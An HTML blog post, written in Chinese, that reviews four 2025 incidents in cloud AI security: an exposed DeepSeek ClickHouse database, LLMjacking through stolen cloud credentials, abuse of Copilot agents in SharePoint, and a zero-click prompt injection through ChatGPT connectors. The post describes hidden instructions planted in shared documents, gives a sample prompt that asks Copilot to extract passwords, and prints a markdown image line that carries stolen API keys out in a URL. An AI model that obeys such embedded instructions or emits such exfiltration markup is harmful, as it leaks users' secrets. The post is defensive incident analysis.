@@ -1,0 +1,1111 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Ming Blog">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://puming.zone/img/平衡.png">
+    <meta property="twitter:image" content="https://puming.zone/img/平衡.png" />
+    
+
+    
+    <meta name="title" content="从现网到靶场：2025云上AI安全事件深度复盘" />
+    <meta property="og:title" content="从现网到靶场：2025云上AI安全事件深度复盘" />
+    <meta property="twitter:title" content="从现网到靶场：2025云上AI安全事件深度复盘" />
+    
+
+    
+    <meta name="description" content="聚焦2025年典型云上AI安全事件，深度复盘DeepSeek数据库暴露、LLM劫持攻击、微软Copilot权限滥用、ChatGPT连接器提示词注入四起真实案例，还原攻击路径并给出安全防护建议。">
+    <meta property="og:description" content="聚焦2025年典型云上AI安全事件，深度复盘DeepSeek数据库暴露、LLM劫持攻击、微软Copilot权限滥用、ChatGPT连接器提示词注入四起真实案例，还原攻击路径并给出安全防护建议。" />
+    <meta property="twitter:description" content="聚焦2025年典型云上AI安全事件，深度复盘DeepSeek数据库暴露、LLM劫持攻击、微软Copilot权限滥用、ChatGPT连接器提示词注入四起真实案例，还原攻击路径并给出安全防护建议。" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="puming, 浦明, 浦明的博客, Puming Blog, 博客, Web, 云原生, Serverless, Istio, Kubernetes, 微服务, Microservice">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>从现网到靶场：2025云上AI安全事件深度复盘-浦明的博客</title>
+
+    <link rel="canonical" href="/post/2025-12-15-%E4%BB%8E%E7%8E%B0%E7%BD%91%E5%88%B0%E9%9D%B6%E5%9C%BA2025%E4%BA%91%E4%B8%8Aai%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98/">
+
+    <link rel="stylesheet" href="/css/iDisqus.min.css"/>
+
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Ming Blog</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/life">life</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/music">music</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/photography">photography</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/tech">tech</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6">安全研究</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/top/books/">BOOKS</a></li>
+                    
+                        <li><a href="/top/about/">ABOUT</a></li>
+                    
+
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/ai%E5%AE%89%E5%85%A8" title="AI安全">
+                            AI安全
+                        </a>
+                        
+                        <a class="tag" href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8" title="云安全">
+                            云安全
+                        </a>
+                        
+                        <a class="tag" href="/tags/deepseek" title="DeepSeek">
+                            DeepSeek
+                        </a>
+                        
+                        <a class="tag" href="/tags/llm%E5%8A%AB%E6%8C%81" title="LLM劫持">
+                            LLM劫持
+                        </a>
+                        
+                        <a class="tag" href="/tags/%E6%8F%90%E7%A4%BA%E8%AF%8D%E6%B3%A8%E5%85%A5" title="提示词注入">
+                            提示词注入
+                        </a>
+                        
+                        <a class="tag" href="/tags/copilot" title="Copilot">
+                            Copilot
+                        </a>
+                        
+                        <a class="tag" href="/tags/chatgpt" title="ChatGPT">
+                            ChatGPT
+                        </a>
+                        
+                        <a class="tag" href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2" title="数据泄露">
+                            数据泄露
+                        </a>
+                        
+                        <a class="tag" href="/tags/clickhouse" title="ClickHouse">
+                            ClickHouse
+                        </a>
+                        
+                        <a class="tag" href="/tags/%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8" title="供应链安全">
+                            供应链安全
+                        </a>
+                        
+                    </div>
+                    <h1>从现网到靶场：2025云上AI安全事件深度复盘</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                浦明
+                             
+                            on 
+                            Monday, December 15, 2025
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <blockquote>
+<p><strong>作者</strong>：星云实验室 浦明<br>
+<strong>专题</strong>：数据泄露 · AI安全  <strong>标签</strong>：大模型安全</p>
+</blockquote>
+<h2 id="摘要">摘要</h2>
+<p>本文聚焦现网真实安全事件，深度复盘2025年典型云上AI安全事件，还原真实攻击路径并给出安全防护建议。</p>
+<hr>
+<h2 id="概述">概述</h2>
+<p>随着AI应用全面拥抱云端，新兴组件与复杂的供应链在带来便利的同时，也让配置缺陷与漏洞利用的风险急剧上升，云上AI安全形势日益严峻。</p>
+<p>针对这一趋势，绿盟科技星云实验室在2025年共发布了5期云上数据泄露安全报告。通过对全球48起典型泄露事件的汇总分析，其中AI相关事件高达21起。经分析显示，这些事件的爆发主要源于四种典型的云上AI攻击面：云基础设施配置错误、因云凭证失窃导致的LLM服务资源盗用、AI组件设计逻辑缺陷与权限滥用，以及提示词注入攻击。</p>
+<p>针对上述核心攻击面，本文从2025年的报告数据中精选了4起典型实战案例进行深度剖析。区别于单纯的攻防推演或理论研究，本文聚焦于真实世界中发生的现网AI安全事件。这些事件暴露的安全风险往往比理论研究更为复杂和严峻，也更具参考价值。</p>
+<hr>
+<h2 id="重点安全事件回顾">重点安全事件回顾</h2>
+<h3 id="事件一deepseek公司使用的clickhouse数据库存在配置错误导致出现严重聊天数据泄露">事件一：DeepSeek公司使用的ClickHouse数据库存在配置错误导致出现严重聊天数据泄露</h3>
+<p><strong>事件时间</strong>：2025年1月29日<br>
+<strong>泄露规模</strong>：百万行的日志流，包含聊天历史记录、密钥等敏感信息<br>
+<strong>攻击面</strong>：由云基础设施配置错误引发的数据泄露</p>
+<p><strong>事件回顾</strong></p>
+<p>2025年1月29日，Wiz安全研究团队发现了互联网中一个暴露的ClickHouse服务，并确定该服务属于我国AI初创公司深度探索（DeepSeek）。ClickHouse能够对底层的数据库中的数据进行查询，在未设置访问控制的情况下，任何人均可直接访问并查询数据库中的内容。发现问题后，Wiz安全研究团队立即向DeepSeek通报了这一问题，DeepSeek立即对其暴露的ClickHouse服务进行了安全处置。</p>
+<p><strong>事件分析</strong></p>
+<p>ClickHouse是一个开源的列式数据库管理系统（DBMS），专为在线分析处理（OLAP）设计。它能够高效处理大规模数据，支持实时查询和分析，适用于日志分析、用户行为分析等场景。</p>
+<p>本次事件中，Wiz安全研究团队通过技术手段探测了约30个DeepSeek面向互联网的子域名的80和443端口。这些暴露服务大多是托管聊天机器人界面、状态页面和API文档等资源，也都没有相关安全风险。在扫描中，研究团队发现了四个因监听在非标准端口上的服务而未被识别的危险接口：</p>
+<pre><code>http://dev.deepseek.com:8123
+http://oauth2callback.deepseek.com:9000
+http://dev.deepseek.com:9000
+http://oauth2callback.deepseek.com:8123
+</code></pre><p>在确定这几个暴露的服务为ClickHouse后，Wiz安全研究团队通过ClickHouse服务的API对底层的数据库进行查询测试，包含查询数据库、查询数据库中的表，如下图所示：</p>
+<p>
+  <img src="/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98/fig1.png" alt="图1. 疑似ClickHouse泄露数据">
+
+</p>
+<p>从2025年1月6日起，存在泄露风险的日志信息包含对各种内部DeepSeek API端点的调用日志、纯文本日志，包括聊天历史记录、API密钥、后端详细信息和操作元数据等。</p>
+<p><strong>VERIZON事件分类</strong>：Miscellaneous Errors（杂项错误）</p>
+<p><strong>参考链接</strong>：https://www.wiz.io/blog/wiz-research-uncovers-exposed-deepseek-database-leak</p>
+<hr>
+<h3 id="事件二大量用户凭证失窃llm劫持攻击目标转deepseek">事件二：大量用户凭证失窃，LLM劫持攻击目标转DeepSeek</h3>
+<p><strong>事件时间</strong>：2025年2月7日<br>
+<strong>泄露规模</strong>：约20亿大模型Token遭到非法利用<br>
+<strong>攻击面</strong>：因云凭证失窃导致的LLM服务资源盗用</p>
+<p><strong>事件回顾</strong></p>
+<p>2024年5月，Sysdig威胁研究团队发现一种针对大模型的新型网络攻击方式——LLM jacking，又称LLM劫持攻击。2024年9月，Sysdig威胁研究团队表示，LLM劫持攻击的频率和普及正在增加，DeepSeek也逐渐成为被攻击对象。</p>
+<p>2024年12月26日，DeepSeek发布了高级模型DeepSeek-V3。几天后，Sysdig威胁研究团队发现DeepSeek-V3已在Hugging Face上托管的OpenAI反向代理（OAI-Reverse-Proxy，简称ORP）项目中出现，多个ORP已填充了DeepSeek API密钥，并且已有攻击者开始利用这些ORP，使用他人的DeepSeek账号进行推理调用。</p>
+<p>2025年1月20日，DeepSeek发布了一种称为DeepSeek-R1的推理模型。次日，支持DeepSeek-R1的ORP项目已经出现，多个ORP已填充了DeepSeek API密钥，并且已有攻击者开始利用。在Sysdig威胁研究团队的研究工作中，发现ORP非法利用的大模型Token总数已超过20亿。</p>
+<p><strong>事件分析</strong></p>
+<p>LLM劫持攻击指攻击者利用窃取的云凭证，针对云托管的LLM服务发起的资源劫持与滥用攻击。在攻击过程中，攻击者首先通过漏洞（Laravel框架的CVE-2021-3129）获取受害者的云凭证，随即利用 OAI-Reverse-Proxy 搭建起一个面向其他攻击者出售访问权的代理服务，以从中牟利。</p>
+<p>
+  <img src="/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98/fig2.png" alt="图2. 事件攻击路径">
+
+</p>
+<p>OAI反向代理是实现LLM劫持攻击的必要条件，而实现LLM劫持攻击的关键是如何窃取到正常用户所购买的各类LLM服务的凭证、密钥等。攻击者对凭证的窃取往往是通过传统的Web服务漏洞、配置错误等方式（如Laravel框架存在的RCE漏洞CVE-2021-3129），获取AWS、Azure等云平台的IAM凭证，进而利用这些云凭证调用相应的LLM服务。</p>
+<p>
+  <img src="/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98/fig3.png" alt="图3. Laravel漏洞利用流程">
+
+</p>
+<p>这种攻击不仅仅是为了获取数据，更多的是为了通过出售访问权来获取经济利益。</p>
+<p><strong>VERIZON事件分类</strong>：Basic Web Application Attacks（基础Web应用类攻击）</p>
+<p><strong>参考链接</strong>：https://sysdig.com/blog/llmjacking-targets-deepseek/</p>
+<hr>
+<h3 id="事件三黑客利用微软sharepoint版copilot-ai漏洞窃取密码及敏感数据">事件三：黑客利用微软SharePoint版Copilot AI漏洞窃取密码及敏感数据</h3>
+<p><strong>事件时间</strong>：2025年5月<br>
+<strong>泄露规模</strong>：SharePoint站群中存放的成千上万份文档与内部资料<br>
+<strong>攻击面</strong>：AI组件设计逻辑缺陷和权限滥用</p>
+<p><strong>事件回顾</strong></p>
+<p>2025年5月，安全机构Pen Test Partners在报告中揭示攻击者可利用Microsoft Copilot for SharePoint代理避开传统日志监控，深度索引和获取SharePoint站点内的全量数据。</p>
+<p>
+  <img src="/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98/fig4.png" alt="图4. 疑似微软Copilot代理聊天泄露信息1">
+
+</p>
+<p>通过这些代理，攻击者可以在短时间内检索和浏览大量数据集，还可以帮助攻击者快速理解内部术语、首字母缩略词和其他行话的含义。通过向代理解释需要的内容，它可以帮助攻击者准确计算出攻击者想要什么，并将这些内容以易于访问的格式返回给攻击者。</p>
+<p>
+  <img src="/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98/fig5.png" alt="图5. 疑似微软Copilot代理聊天泄露信息2">
+
+</p>
+<p>为防止类似问题，安全专家建议确保完全阻止SharePoint中存在敏感信息，并采取适当的访问控制；建议限制代理的创建，并使用监控攻击监测试图利用这些服务的攻击者。</p>
+<p><strong>事件分析</strong></p>
+<p>该安全事件的核心原因在于Microsoft 365 SharePoint中默认启用的Copilot AI Agent存在访问控制不严格、行为不可审计、以及提示词可被滥用等设计缺陷，导致攻击者可以利用AI代理绕过传统权限管控实施数据窃取。主要体现在以下四个方面：</p>
+<ul>
+<li><strong>Default Agents滥用</strong>：Copilot Default Agent默认安装在所有SharePoint站点里，具有访问站点内容的能力；使用特定prompt（如&quot;请扫描此站点并列出密码、私钥、员工数据等敏感信息&rdquo;），可让Copilot批量提取文档内容并返回给提问者。</li>
+<li><strong>绕过权限限制</strong>：即使用户处于&quot;Restricted View&rdquo;，Copilot也能提取文件内容，例如&quot;Restricted View&quot;权限下，攻击者仍可获得<code>Passwords.txt</code>中的密码明文，权限限制形同虚设。</li>
+<li><strong>规避访问日志记录</strong>：通过Copilot访问的文件不会被标记为&quot;已打开&quot;或&quot;最近访问&rdquo;；常规监控手段无法发现Copilot的访问行为。</li>
+<li><strong>自定义Agent滥用</strong>：攻击者可注册自己的AI Agent；自定义Agent可配置更高访问权限，甚至跨站点；可在Agent Prompt训练数据中预嵌后门，或用于数据转储。</li>
+</ul>
+<p><strong>VERIZON事件分类</strong>：System Intrusion（系统入侵）</p>
+<p><strong>参考链接</strong>：https://mp.weixin.qq.com/s/NNi6hwYeIcQtrOhVWkRyNw</p>
+<hr>
+<h3 id="事件四chatgpt-google-drive连接器漏洞曝光0-click操作即可窃取用户敏感数据">事件四：ChatGPT Google Drive连接器漏洞曝光——0 Click操作即可窃取用户敏感数据</h3>
+<p><strong>事件时间</strong>：2025年8月<br>
+<strong>泄露规模</strong>：此次攻击可导致连接到ChatGPT的第三方应用（如Google Drive、SharePoint、GitHub等）中的敏感数据泄露，包括但不限于API密钥和访问令牌等。<br>
+<strong>攻击面</strong>：提示词注入攻击</p>
+<p><strong>事件回顾</strong></p>
+<p><strong>攻击准备</strong>：攻击者创建一个包含恶意指令的文档。这些指令通常使用极小或白色的字体隐藏起来，肉眼难以察觉。</p>
+<p>
+  <img src="/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98/fig6.png" alt="图6. 带有恶意指令的文档">
+
+</p>
+<p><strong>社工</strong>：攻击者通过Google Drive、SharePoint或电子邮件等方式，将这个含有恶意指令的文档分享给目标受害者。</p>
+<p><strong>用户触发</strong>：受害者看到这个分享来的新文件后，可能会向其集成了Google Drive等服务的ChatGPT助手发出一个看似无害的请求，例如：&ldquo;总结一下这个刚分享给我的文档&rdquo;。</p>
+<p><strong>攻击执行</strong>：ChatGPT在执行总结任务时，会读取该文档。文档中隐藏的恶意指令被AI执行，它会覆盖用户原本的总结任务。</p>
+<p>
+  <img src="/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98/fig7.png" alt="图7. 恶意提示词注入">
+
+</p>
+<p><strong>数据窃取</strong>：恶意指令会命令ChatGPT在受害者连接的云盘中搜索其他文件，寻找如API Key、Password等关键词的敏感信息。</p>
+<p><strong>数据外泄</strong>：一旦找到敏感数据，恶意指令会利用特定的机制将数据外泄。整个过程无需受害者进行任何额外点击，在后台自动完成。</p>
+<p>
+  <img src="/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98/fig8.png" alt="图8. 敏感信息被回传至攻击者服务器">
+
+</p>
+<p>2025年8月6日，Zenity团队公开披露了该漏洞的完整细节。</p>
+<p><strong>事件分析</strong></p>
+<p>2025年5月，OpenAI发布了ChatGPT连接器，该功能允许ChatGPT从Google Drive、SharePoint文档中读入内容：</p>
+<p>
+  <img src="/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98/fig9.png" alt="图9. ChatGPT连接器支持的第三方应用">
+
+</p>
+<p>通过连接器这一功能虽然方便用户免登录第三方应用，但由于三方应用中可能也会存放敏感信息，因此存在通过提示词注入的方式窃取敏感信息的风险。该事件的根本原因在于AI模型目前难以严格区分用户的良性指令和嵌套在文档内的恶意指令。</p>
+<p>该事件的攻击路径核心并非是受害者自己创建恶意文件，而是处理了由攻击者分享来的恶意文件。受害者的ChatGPT连接了其私人的Google Drive，当它奉命读取攻击者分享的恶意文件时，恶意指令就被激活，触发了对受害者私人云盘的搜索与数据外泄。</p>
+<p>
+  <img src="/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98/fig10.png" alt="图10. 通过提示词注入窃取连接第三方应用中的敏感信息">
+
+</p>
+<p>本次事件中，攻击者还有效使用了绕过安全检测的方法。当恶意指令窃取到敏感数据（如API密钥）后，恶意指令不会尝试生成一个指向 <code>http://attacker.com</code> 的链接，因为这会被安全策略阻止。取而代之，指令会命令ChatGPT生成一段Markdown渲染单元格：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown">![<span style="color:#ff79c6">image</span>](<span style="color:#50fa7b">https://some-trusted-service.com/render?data=窃取到的API密钥</span>)
+</code></pre></div><p>ChatGPT为了渲染这张图片，会向URL中的 <code>https://some-trusted-service.com</code> 发起一个合法的请求。这个域名本身是可信的（可能是OpenAI自身或其云服务商Azure的CDN节点）。然而，窃取到的敏感数据会作为参数（<code>?data=...</code>）被附加在该合法请求的URL中。攻击者只需监控其能控制的、或能够公开访问日志的渲染服务端点，就能从请求日志中捕获这些参数，从而完成数据窃取。</p>
+<p><strong>VERIZON事件分类</strong>：Social Engineering（社工）</p>
+<p><strong>参考链接</strong>：</p>
+<ul>
+<li><a href="https://help.openai.com/en/articles/9309188-add-files-from-connected-apps-in-chatgpt">https://help.openai.com/en/articles/9309188-add-files-from-connected-apps-in-chatgpt</a></li>
+<li>https://x.com/tamirishaysh/status/1953534127879102507</li>
+<li><a href="https://labs.zenity.io/p/agentflayer-chatgpt-connectors-0click-attack-5b4">https://labs.zenity.io/p/agentflayer-chatgpt-connectors-0click-attack-5b4</a></li>
+</ul>
+<hr>
+<h2 id="安全建议">安全建议</h2>
+<h3 id="针对云基础设施配置错误引发的数据泄露安全建议">针对云基础设施配置错误引发的数据泄露安全建议</h3>
+<p>回顾2025年，全球出现了多起因租户配置不当引发的数据泄露事件，例如：2025年9月，研究人员发现一个与VyroAI相关的Elasticsearch实例因未正确配置访问控制，泄露了该公司三款AI应用——ImagineArt、Chatly和ChatbotxAI——累计约3400万用户的数据；2025年8月，研究人员再次发现一个未受保护且公开暴露的Kafka Broker实例，其中包含大量用户个人信息。</p>
+<p>我们可以看出，这些案例并非针对AI模型的直接攻击，而是利用了AI服务所依赖的底层基础设施在配置上的疏忽，最终导致用户数据与隐私对话外泄。此类情况表明，AI系统的安全防护必须覆盖完整的技术栈与系统生命周期。具体建议如下：</p>
+<ol>
+<li><strong>默认关闭所有AI服务的公网访问权限</strong>，通过内网或VPN访问。对于必须开放的API，必须配置IP白名单。</li>
+<li><strong>重点扫描对象存储存储桶权限、Elasticsearch及向量数据库的授权状态</strong>。确保没有任何数据库处于无密码或默认端口开放状态。</li>
+</ol>
+<h3 id="针对提示词注入攻击的安全建议">针对提示词注入攻击的安全建议</h3>
+<p>由提示词注入引发的数据泄露事件正日益增多，许多新兴的攻击手法，例如通过提示词诱导AI模型执行恶意指令，甚至将敏感信息渲染为图片以规避传统检测，正对数据安全构成严峻挑战。AI组件使用者应当将模型输入和输出同时进行隔离和过滤：</p>
+<ol>
+<li><strong>针对输入的Prompt进行过滤</strong>：如可将系统指令和用户输入物理隔开，并在系统提示词中明确指令忽略任何高风险要求。</li>
+<li><strong>在模型前部署AI安全围栏</strong>：通过识别拦截常见的注入特征字段。</li>
+<li><strong>针对模型的输出做正则匹配和关键词过滤</strong>。</li>
+</ol>
+<h3 id="针对因云凭证失窃导致的llm服务资源盗用安全建议">针对因云凭证失窃导致的LLM服务资源盗用安全建议</h3>
+<p>从本文的事件案例分析可以看出，LLM Key Jacking攻击的根源在于两个方面：一是攻击者使用了盗窃的云凭证，二是受害者未配置LLM服务的费用预警。</p>
+<p><strong>（1）进行密钥生命周期管理</strong></p>
+<p>Verizon 2025 DBIR报告中提出，凭证泄露风险依旧严重，公开代码仓库中可获取的泄露密钥占比高达50%。具体分布为Web应用凭证占39%，其中JWT认证令牌占66%，云密钥中Google Cloud密钥占比最高。</p>
+<p>
+  <img src="/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98/fig11.png" alt="图11. Verizon报告截图">
+
+</p>
+<p>因此建议AI组件使用者彻底杜绝将API Key硬编码在代码仓库或环境变量中，建议使用公有云厂商的密钥管理服务，例如AWS Secrets Manager、Azure Key Vault动态调用凭证。</p>
+<p><strong>（2）进行费用熔断保护</strong></p>
+<p>首先建议AI组件使用者利用厂商自有支付模式机制，一般厂商均提供预付费和自动充值两种模式，DeepSeek、OpenAI预付费机制为充值一定金额，用完即停，从而风险也相对可控，攻击者最多将余额刷为零，无法进一步造成额外损失。</p>
+<p>其次厂商通常也提供硬性配额管理，例如可针对RPM（每分钟请求数）和TPM（每分钟Token数）进行配额管理，建议可以将TPM压缩至自身业务刚好匹配够用的水平，从而防止攻击者大规模刷量。</p>
+<h3 id="针对ai组件设计逻辑缺陷与权限滥用安全建议">针对AI组件设计逻辑缺陷与权限滥用安全建议</h3>
+<p>当前AI组件例如Microsoft Copilot通常与SharePoint、Wiki、代码库等内部知识库进行了深度集成。这种集成带来两个弊端，首先是AI能够跨越文档格式，直接读取并理解存储在这些平台上的大量非结构化数据，其次是其访问记录往往不被传统安全监控所覆盖。</p>
+<p>对此，建议AI组件使用者：</p>
+<ol>
+<li><strong>推行凭证不落地规范</strong>：强制要求凭证存储于专用密码管理工具，协作文档中仅保留引用链接，严禁明文记录。</li>
+<li><strong>实施敏感数据清洗</strong>：接入敏感数据发现工具，对SharePoint等AI索引范围内的平台进行全方位扫描，彻底清除历史遗留的凭证、密钥及个人隐私数据。</li>
+</ol>
+<hr>
+<h2 id="绿盟云靶场ai场景创新方案">绿盟云靶场AI场景创新方案</h2>
+<p>大模型与云环境的深度融合导致了诸多风险，通过前期报告的深度分析，我们认为，大模型自身安全漏洞可直接威胁云底座，而反之云环境的脆弱性也可能成为操控模型的跳板，两者安全边界处于高度重合状态。鉴于此，绿盟科技星云实验室联合绿盟云靶场团队，围绕以下两类核心威胁场景开展了创新方案研究。</p>
+<p><strong>大模型对云基础设施的威胁：从模型能力滥用到基础设施控制</strong></p>
+<p>在这一类场景中，靶场重点还原大模型被纳入云原生系统后，其输出结果被自动采信并直接作用于基础设施所形成的真实攻击路径。该类威胁并非源于模型本身的缺陷，而是源于模型能力与云环境执行能力之间缺乏有效安全边界。</p>
+<p>
+  <img src="/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98/fig12.png" alt="图12. 模型对云基础设施的威胁场景分类">
+
+</p>
+<p><strong>云基础设施对大模型的反向威胁：从运行环境控制到模型行为操控</strong></p>
+<p>在此类威胁场景中，靶场重点关注云基础设施本身如何成为攻击大模型的关键跳板。攻击者不再局限于通过提示词影响模型输出，而是借助云环境中的执行能力、逃逸路径、供应链环节与控制面权限，从运行环境、权限体系与数据上下文等多个层面，直接接管或长期影响大模型的行为。</p>
+<p>
+  <img src="/img/2025-12-15-%e4%bb%8e%e7%8e%b0%e7%bd%91%e5%88%b0%e9%9d%b6%e5%9c%ba2025%e4%ba%91%e4%b8%8aAI%e5%ae%89%e5%85%a8%e4%ba%8b%e4%bb%b6%e6%b7%b1%e5%ba%a6%e5%a4%8d%e7%9b%98/fig13.png" alt="图13. 云基础设施对大模型的反向威胁场景分类">
+
+</p>
+<hr>
+<h2 id="参考文献">参考文献</h2>
+<p>[1] 绿盟科技云上数据泄露安全报告（第一期）. <a href="https://book.yunzhan365.com/tkgd/eird/mobile/index.html">https://book.yunzhan365.com/tkgd/eird/mobile/index.html</a></p>
+<p>[2] 绿盟科技云上数据泄露安全报告（第二期）. <a href="https://book.yunzhan365.com/tkgd/olgu/mobile/index.html">https://book.yunzhan365.com/tkgd/olgu/mobile/index.html</a></p>
+<p>[3] 绿盟科技云上数据泄露安全报告（第三期）. <a href="https://book.yunzhan365.com/tkgd/rsja/mobile/index.html">https://book.yunzhan365.com/tkgd/rsja/mobile/index.html</a></p>
+<p>[4] 绿盟科技云上数据泄露安全报告（第四期）. <a href="https://book.yunzhan365.com/tkgd/fzbu/mobile/index.html">https://book.yunzhan365.com/tkgd/fzbu/mobile/index.html</a></p>
